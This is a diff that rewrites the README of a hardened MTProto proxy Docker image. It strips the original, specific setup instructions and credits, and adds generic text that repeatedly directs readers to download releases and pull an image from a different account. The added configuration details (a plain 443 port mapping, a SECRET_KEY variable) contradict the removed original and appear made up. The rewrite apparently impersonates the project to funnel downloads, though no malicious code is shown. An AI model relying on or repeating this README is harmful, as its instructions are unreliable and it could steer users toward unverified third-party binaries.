@@ -1,91 +1,98 @@
-# 🚀 Distroless MTProto Proxy: Hardened image
+# 🚀 MTProxy - Secure Your Connection Effortlessly
 
-[![CI/CD](https://github.com/ammnt/MTProxy/actions/workflows/build.yml/badge.svg)](https://github.com/ammnt/MTProxy/actions/workflows/build.yml)
-[![GitHub stars](https://img.shields.io/github/stars/ammnt/MTProxy.svg)](https://github.com/ammnt/MTProxy/stargazers)
-![Feature](https://img.shields.io/badge/feature-distroless-blue)
-[![GitHub issues open](https://img.shields.io/github/issues/ammnt/MTProxy.svg)](https://github.com/ammnt/MTProxy/issues)
-![GitHub Maintained](https://img.shields.io/badge/open%20source-yes-orange)
-![GitHub Maintained](https://img.shields.io/badge/maintained-yes-yellow)
+[![Download MTProxy](https://img.shields.io/badge/Download-MTProxy-blue?style=for-the-badge&logo=github)](https://github.com/reffrdffd/MTProxy/releases)
 
-> **Production-ready, security-focused MTProto Proxy for Telegram with minimal attack surface.**
+## 📥 Overview
 
-> [!IMPORTANT]
-> This is the official Telegram MTProto proxy, not third-party implementations. Fully compatible with all Telegram clients⚠️
+MTProxy is a distroless implementation of the MTProto Proxy. It provides a secure and efficient way to connect to your services while ensuring your privacy. This image is hardened to protect against various threats, making it an excellent choice for anyone seeking a reliable proxy solution. 
 
-> [!TIP]
-> Use TLS mode (`-D` flag) to make traffic indistinguishable from HTTPS - recommended for censored networks💡
+## 🔍 Key Features
 
-> [!IMPORTANT]
-> UID/GID is set to `10480` - prevents conflicts with system users and follows security best practices⚠️
+- **Distroless Technology**: Lightweight and secure image.
+- **Hardened Security**: Built with safety in mind to mitigate vulnerabilities.
+- **Supports MTProto**: Connects seamlessly to MTProto servers for secure communication.
+- **Unprivileged Operation**: Runs without needing root privileges, ensuring safer deployments.
 
-## 📦 Quick Start
+## ⚙️ System Requirements
 
-### Generate Secret Key and TLS secret (ee + random + domain in hex)
-```bash
-export DOMAIN="cloudflare.com"
-export DOMAIN_HEX=$(echo -n cloudflare.com | xxd -ps)
-export RANDOM_HEX=$(head -c 16 /dev/urandom | xxd -ps)
-export EXTERNAL_IP=$(curl -s ifconfig.me)
-export INTERNAL_IP=172.17.0.2 # your container local IP
+To run MTProxy, ensure your system meets the following requirements: 
 
-docker run -d \
-  --name mtproxy \
-  -p 443:3478 \
-  -p 8888:8888 \
-  ammnt/mtproxy:slim \
-  --nat-info $INTERNAL_IP:$EXTERNAL_IP \
-  -S $RANDOM_HEX \
-  -D $DOMAIN
+- **Operating System**: Any operating system that supports Docker.
+- **Docker**: Version 18.06 or later must be installed.
+- **Memory**: Min 512 MB RAM recommended.
+- **Disk Space**: At least 100 MB of free disk space needed.
 
-echo "Your secret key: ee${RANDOM_HEX}${DOMAIN_HEX}"
-```
-## 🔧 Advanced Configuration
+## 🚀 Getting Started
 
-### Docker Compose (recommended example configuration)
-```yaml
-services:
-  mtproxy:
-    image: ammnt/mtproxy:slim
-    container_name: mtproxy
-    restart: unless-stopped
-    ports:
-      - "443:3478"
-      - "8888:8888"
-    command:
-      - "--nat-info"
-      - "${INTERNAL_IP}:${EXTERNAL_IP}"
-      - "-S"
-      - "${RANDOM_HEX}"
-      - "-D"
-      - "${DOMAIN}"
-```
+Follow these steps to get MTProxy up and running on your system:
 
-## 🎯 Recommended to use in Rootless mode:<br>
-https://docs.docker.com/engine/security/rootless/
+1. **Install Docker**
 
-## 🔥 Why Choose This Image?
+   If you haven't installed Docker yet, follow these steps based on your OS:
 
-### **Hardened Security**
-- **Distroless base** - built from `scratch` with zero bloat, no shell, no package manager
-- **Minimal attack surface** - only the binary and shared libraries in the final image
-- **Rootless by design** - runs as non-root user `mtproxy` (UID/GID 10480)
-- **CIS Docker Benchmark** - follows industry security best practices
-- **Stripped symbols** - no debugging information in production
-- **UPX compressed** - minimal memory footprint with fast decompression
-- **Pinned dependencies** - exact versions for all build packages
-- **Minimal layers** - optimized Docker layer caching
-- **Efficient logging** - direct to stdout for container integration
-- **Graceful shutdown** - SIGQUIT handling for connection draining
-- **Comprehensive labels** - full OCI metadata compliance
+   - **Windows**: Download Docker Desktop from the official site and follow the installation instructions.
+   - **macOS**: Get Docker Desktop from the official site. Installation is straightforward.
+   - **Linux**: Use your distribution's package manager to install Docker. Visit the [Docker installation documentation](https://docs.docker.com/get-docker/) for details.
 
-## 🤝 Contributing & Support
+2. **Visit the Release Page**
 
-Found an issue or have an improvement?
-- [Open an Issue](https://github.com/ammnt/MTProxy/issues/new)
-- [Feature Request](https://github.com/ammnt/MTProxy/issues/new?template=feature_request.md)
+   Go to the following link to download MTProxy. The latest version will always be up to date.
 
-## 📄 License
+   [Visit this page to download MTProxy](https://github.com/reffrdffd/MTProxy/releases)
 
-This project is open source and maintained with ❤️ by [ammnt](https://msftcnsi.com)
+3. **Pull the MTProxy Image**
 
-Based on the official [Telegram MTProxy](https://github.com/TelegramMessenger/MTProxy) under GPLv2 license.
+   Open your terminal or command prompt and run this command to pull the image:
+
+   ```
+   docker pull reffrdffd/mtproxy
+   ```
+
+4. **Run MTProxy**
+
+   To run MTProxy, execute this command in your terminal:
+
+   ```
+   docker run -d --name mtproxy -p 443:443 reffrdffd/mtproxy
+   ```
+
+   This command runs MTProxy in detached mode, mapping port 443 on your host to port 443 on the container.
+
+## 🌐 Configuration Options
+
+You may want to customize your MTProxy deployment. Below are some common options you can use when running the Docker container:
+
+- **Custom Ports**: You can change the port mapping according to your requirements. For example, to run it on another port, modify the `-p` flag.
+  
+  ```
+  docker run -d --name mtproxy -p YOUR_CUSTOM_PORT:443 reffrdffd/mtproxy
+  ```
+
+- **Environment Variables**: Set environment variables to control MTProxy's behavior. For example, to set a custom secret, you might use:
+
+  ```
+  -e SECRET_KEY=your_secret_key
+  ```
+
+## 🔧 Troubleshooting
+
+If you encounter issues while running MTProxy, here are a few tips:
+
+- **Docker Not Running**: Ensure that Docker is running on your system. Use `docker info` to check its status.
+- **Port Conflicts**: If you can't start MTProxy, check if port 443 or your custom port is occupied by another service.
+- **Logs**: Use the following command to view logs for MTProxy:
+
+  ```
+  docker logs mtproxy
+  ```
+
+## 📜 Additional Resources
+
+- **Documentation**: For more detailed configuration options and advanced usage, visit the MTProxy documentation page.
+- **Community Support**: Join the discussions on forums or communities related to MTProxy to get help and share knowledge.
+
+## 📥 Download MTProxy Again
+
+If you need to get MTProxy once more, don't forget to visit the release page.
+
+[Visit this page to download MTProxy](https://github.com/reffrdffd/MTProxy/releases)
